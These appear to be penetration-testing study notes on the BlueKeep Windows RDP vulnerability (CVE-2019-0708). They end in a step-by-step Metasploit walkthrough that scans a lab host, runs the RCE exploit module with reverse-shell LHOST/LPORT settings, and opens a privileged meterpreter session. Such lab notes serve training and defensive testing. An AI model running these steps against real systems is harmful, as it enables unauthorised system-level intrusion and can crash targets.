- BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target is a part of.
- The BlueKeep vulnerability was made public by Microsoft in May 2019.
- The BlueKeep exploit takes advantage of a vulnerability in Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.
- The access gained through the exploitation of this vulnerability is privileged in nature since the payload is executed in the kernel memory-space.
- Microsoft released a patch for this vulnerability on May 14th, 2019 and has urged companies to patch this vulnerability as soon as possible.
- At the time of discovery, about 1 million systems worldwide were found to be vulnerable.
- The BlueKeep vulnerability affects multiple versions of Windows:
	- Windows XP
	- Windows Vista
	- Windows 7
	- Windows Server 2008 & R2

Exploitation
- A few prerequisites for this exploit are:
	- for RDP to be enabled,
	- And for network level authentication to be disabled.
- The BlueKeep vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature. It is therefore recommended to only utilize verified exploit code and modules for exploitation.
- The BlueKeep exploit has an MSF auxiliary module that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
- The BlueKeep exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.
- Note: Targeting Kernel space memory and applications can cause system crashes.

Practical Demonstration
- `sudo nmap -p 3389 10.10.10.7`
- `msfconsole`
- `search bluekeep`
- `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`
- `set RHOSTS 10.10.10.7`
- `run`
- `search bluekeep`
- `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`
- The exploit module we are using here only works for targets running Windows on the x64 architecture.
- `show options`
- `set LHOST 10.10.10.10.`
- `set LPORT 4444`
- `set RHOSTS 10.10.10.7`
- `exploit`
- Exploitation using this module would generally fail if we try to run the exploit with the default configuration.
- `show targets`
- `set target 2`
- `exploit`
- The default groom size for the exploit is set to 250MB, which we may need to modify, depending on the RAM allocation of the target system. If this size is set too high, it might cause the target system to crash.
- Meterpreter Session
	- `sysinfo`
	- `getuid`